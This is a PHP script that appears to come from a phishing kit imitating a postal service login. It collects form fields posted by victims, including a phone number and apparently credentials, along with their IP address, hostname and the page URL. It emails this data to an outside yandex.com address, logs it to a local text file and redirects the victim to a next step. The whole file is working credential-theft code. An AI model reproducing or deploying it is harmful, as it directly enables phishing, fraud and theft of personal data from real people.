<?php
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "proc2.php";
$hostname = gethostbyaddr($ip);
$message .= "~~~~~~ Login ~~~~~~\n";
$message .= "tel              : ".$_POST['Editbox1']."\n";
$message .= "".$_POST['x2']." ";
$message .= "".$_POST['x3']."\n";
$message .= "~~~~~~~~~ Infos ~~~~~~~~~~~\n";
$message .= "IPs              : $ip\n";
$message .= "HN               : $hostname\n";
$message .= " U7l             : $link\n";
$message .= "~~~~~~~ ND7 ND7 ~~~~~~~\n";
$send = "saadnasreddine@yandex.com";
$subject = "postale | $ip ";
$headers = "From:postale<webmaster@localhost>";
mail($send,$subject,$message,$headers);
 
$file = fopen("../SE/infos.txt","a");
fwrite($file,$message); 

header("Location: $back");

?>